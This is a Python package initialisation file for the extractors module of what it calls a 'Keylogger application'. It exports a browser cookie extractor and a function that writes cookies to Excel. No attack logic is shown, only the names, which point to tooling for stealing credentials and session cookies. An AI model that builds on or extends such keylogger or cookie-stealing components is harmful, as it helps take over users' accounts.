#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
Extractors package for the Keylogger application
"""

__author__ = "Developer"
__version__ = "1.0.0"

from .browser_cookie_extractor import BrowserCookieExtractor, extract_cookies_to_excel

__all__ = ['BrowserCookieExtractor', 'extract_cookies_to_excel']